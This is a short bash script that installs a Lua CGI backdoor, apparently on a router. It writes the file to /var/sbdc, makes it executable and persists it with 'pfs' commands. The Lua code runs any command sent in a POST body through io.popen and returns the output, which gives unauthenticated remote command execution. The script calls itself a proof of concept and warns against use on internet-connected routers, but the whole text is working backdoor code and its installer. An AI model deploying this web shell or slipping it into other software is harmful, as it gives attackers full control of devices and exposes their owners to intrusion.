#!/bin/bash
cat > /var/sbdc/backdoor.ha << EOF
#!/usr/bin/env lua
local io = io
local os = os
local tonumber = tonumber
local tostring = tostring
local content_len = tonumber(os.getenv("CONTENT_LENGTH") or "0")
local body = ""
if content_len and content_len > 0 then
  body = io.read(content_len) or ""
else
  body = io.read("*a") or ""
end
local function trim(s)
  if not s then return "" end
  s = s:gsub("^%s+", "")
  s = s:gsub("%s+$", "")
  return s
end
local token = trim(body)
io.write("Content-Type: text/plain\r\n\r\n")
io.write("POC-WAN backdoor: DO NOT RUN ON A REAL ROUTER CONNECTED TO THE INTERNET\n")
if token == "" then
  io.write("error: no command token supplied (POST command to run)\n")
  return
end
io.write("Requested cmd: " .. token .. "\n\n")
local f, ferr = io.popen(token, "r")
if not f then
  io.write("failed to execute command: ", tostring(ferr or "unknown"), "\n")
  os.exit(1)
end

local out = f:read("*a") or ""
f:close()
local MAX_OUTPUT = 32 * 1024  -- 32 KB
if #out > MAX_OUTPUT then
  io.write(out:sub(1, MAX_OUTPUT))
  io.write("\n[output truncated, length=", tostring(#out), "]\n")
else
  io.write(out)
end
io.write("\n--- end ---\n")

EOF

chmod +x /var/sbdc/backdoor.ha 
pfs -a /var/sbdc/backdoor.ha 
pfs -s
echo "backdoor installed"